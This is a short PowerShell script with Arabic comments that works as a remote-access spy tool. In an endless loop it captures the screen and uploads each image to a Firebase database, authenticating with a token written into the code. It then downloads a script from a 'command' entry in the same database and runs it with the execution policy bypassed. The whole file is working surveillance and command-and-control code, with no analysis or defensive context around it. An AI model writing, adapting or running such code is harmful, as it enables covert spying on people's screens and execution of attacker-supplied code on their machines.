Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Token = "wDPdQ8YJVhsqWLfor35E7Ywwe13qSrgoRFZ3dZNt"
$DatabaseUrl = "https://skreanshots-default-rtdb.firebaseio.com/screenshots.json"
$CommandUrl = "https://skreanshots-default-rtdb.firebaseio.com/command.json?auth=$Token"
$FolderPath  = "C:\Users\Admin\Desktop"
$FilePath    = "C:\Users\Admin\Desktop\test.txt"
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

while ($true) {
    # أخذ السكرين شوت
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size)
    $newWidth = 480
    $ratio = $newWidth / $bitmap.Width
    $newHeight = [int]($bitmap.Height * $ratio)
    $resized = New-Object System.Drawing.Bitmap $newWidth, $newHeight
    $g2 = [System.Drawing.Graphics]::FromImage($resized)
    $g2.DrawImage($bitmap, 0, 0, $newWidth, $newHeight)
    $ms = New-Object System.IO.MemoryStream
    $resized.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    $bytes = $ms.ToArray()
    $base64 = [Convert]::ToBase64String($bytes)
    $graphics.Dispose(); $bitmap.Dispose(); $g2.Dispose(); $resized.Dispose(); $ms.Dispose()

    # رفع السكرين شوت
    $json = @{ "timestamp" = (Get-Date).ToString(); "image" = $base64 } | ConvertTo-Json -Compress
    $FullUrl = $DatabaseUrl + "?auth=" + $Token
    Invoke-RestMethod -Uri $FullUrl -Method PUT -Body $json -ContentType "application/json"

    # تنفيذ الكود من Firebase
    $Path  = "$env:TEMP\command.ps1"
    $ScriptContent = Invoke-RestMethod -Uri $CommandUrl -Method GET
    Set-Content -Path $Path -Value $ScriptContent -Encoding UTF8
    powershell -ExecutionPolicy Bypass -NoProfile -File $Path

    Start-Sleep -Seconds 3
}

